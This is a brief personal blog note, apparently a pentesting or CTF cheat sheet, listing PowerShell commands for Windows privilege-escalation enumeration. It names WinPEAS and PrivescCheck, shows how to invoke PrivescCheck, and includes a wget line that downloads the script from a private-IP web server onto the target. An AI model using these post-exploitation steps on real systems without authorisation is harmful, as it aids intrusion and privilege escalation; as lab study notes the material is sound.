---
title: "PowerShell"
#published: 2024-05-25T10:36:08+10:00
# lastUpdated: 2024-05-25T10:36:08+10:00
url: powershell
alias: # aliases for multiple
    - 
    - 

cover:
    #image: "<image path/url>"
    # alt: "<alt text>"
    # caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles 

type: note # letter, note, page
categories: shell # Homelab, Writeup, Personal
tags:
    - 
    - 

draft: false

# ShowToc: false
# TocOpen: false

# searchHidden: true # Make false to hide page from search
---

```markdown
whoami /priv
whoami /all

gci -recurse .
gci -recurse -hidden .

Manual Enum
- C:\Users
- C:\
- C:\Windows\Temp

Auto Enum
- Winpeas
- PrivesCheck (https://github.com/itm4n/PrivescCheck)
 - . .\PrivescCheck.ps1; Invoke-PrivescCheck

Transfer
- wget http://$ip/ -UseBasicParsing -OutFile $file.ext

wget http://10.4.59.208:8000/PrivescCheck.ps1 -UseBasicParsing -OutFile PrivescCheck.ps1```

---

Thanks for reading
